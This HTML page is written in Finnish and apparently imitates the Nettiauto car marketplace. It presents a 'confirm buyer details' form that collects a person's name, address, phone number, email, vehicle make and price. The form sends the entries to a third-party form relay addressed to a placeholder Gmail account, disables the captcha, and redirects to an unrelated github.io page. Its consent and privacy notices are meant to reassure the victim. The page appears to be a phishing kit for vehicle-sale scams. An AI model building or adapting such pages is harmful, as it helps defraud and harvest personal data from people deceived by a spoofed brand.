<!DOCTYPE html>
<html lang="fi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Vahvista ostajan tiedot</title>

<style>
/* RESET */
* {
    box-sizing: border-box;
}

body {
    margin: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
    background-color: #f2f4f7;
    color: #1a1a1a;
}

/* HEADER (Nettiauto-tyyli) */
.na-header {
    background-color: #ffffff;
    border-bottom: 3px solid #CC3300;
    height: 64px;
    display: flex;
    align-items: center;
}

.na-header-inner {
    max-width: 1200px;
    width: 100%;
    margin: 0 auto;
    padding: 0 16px;
}

.na-logo {
    height: 32px;
}

/* FORM CARD */
.container {
    max-width: 520px;
    margin: 32px auto;
    background: #ffffff;
    border-radius: 8px;
    padding: 28px;
    box-shadow: 0 1px 6px rgba(0,0,0,0.08);
}

h1 {
    font-size: 22px;
    margin-bottom: 8px;
}

.description {
    font-size: 14px;
    color: #555;
    margin-bottom: 24px;
}

label {
    display: block;
    font-weight: 600;
    margin-top: 16px;
    font-size: 14px;
}

input[type="text"],
input[type="email"],
input[type="tel"],
input[type="number"] {
    width: 100%;
    padding: 12px;
    margin-top: 6px;
    border-radius: 6px;
    border: 1px solid #cfd6e0;
    font-size: 14px;
}

input:focus {
    outline: none;
    border-color: #0072ce;
}

/* CHECKBOX */
.checkbox {
    display: flex;
    align-items: flex-start;
    gap: 10px;
    margin-top: 20px;
    font-size: 13px;
    color: #444;
}

.checkbox input {
    margin-top: 3px;
}

/* BUTTON */
button {
    width: 100%;
    margin-top: 28px;
    padding: 14px;
    background-color: #0072ce;
    color: #ffffff;
    font-size: 16px;
    font-weight: 600;
    border: none;
    border-radius: 6px;
    cursor: pointer;
}

button:hover {
    background-color: #005fa3;
}

.notice {
    margin-top: 18px;
    font-size: 12px;
    color: #666;
    line-height: 1.4;
}

/* RESPONSIVE */
@media (max-width: 600px) {
    .container {
        margin: 16px;
        padding: 20px;
    }

    h1 {
        font-size: 20px;
    }
}
</style>
</head>

<body>

<!-- HEADER -->
<header class="na-header">
  <div class="na-header-inner">
    <img src="logo.png" alt="Nettiauto" class="na-logo">
  </div>
</header>

<!-- FORM -->
<div class="container">

    <h1>Vahvista ostajan tiedot</h1>
    <div class="description">
        Täytä alla olevat tiedot viimeistelläksesi ajoneuvokaupan.
    </div>

    <form action="https://formsubmit.co/TYO_EMAIL@gmail.com" method="POST">

        <label>Nimi</label>
        <input type="text" name="Nimi" placeholder="Etunimi ja sukunimi" required>

        <label>Osoite</label>
        <input type="text" name="Osoite" placeholder="Katuosoite, kaupunki" required>

        <label>Puhelinnumero</label>
        <input type="tel" name="Puhelin" placeholder="+358 XX XXX XXXX" required>

        <label>Sähköpostiosoite</label>
        <input type="email" name="Email" placeholder="esimerkki@email.com" required>

        <label>Ajoneuvon merkki</label>
        <input type="text" name="Auton merkki" placeholder="Esim. Volvo, Audi" required>

        <label>Hinta (€)</label>
        <input type="number" name="Hinta" placeholder="Syötä kauppahinta" required>

        <!-- CONSENT CHECKBOX -->
        <div class="checkbox">
            <input type="checkbox" required>
            <span>
                Hyväksyn tietojeni käsittelyn ajoneuvokaupan vahvistamista varten.
            </span>
        </div>

        <!-- FormSubmit -->
        <input type="hidden" name="_subject" value="Uusi ajoneuvokaupan vahvistus">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://alfredodefaro-ai.github.io/form/success.html">

        <button type="submit">Vahvista tiedot</button>
    </form>

    <div class="notice">
        Tietoja käytetään ainoastaan ajoneuvokaupan käsittelyyn.
    </div>

</div>

</body>
</html>
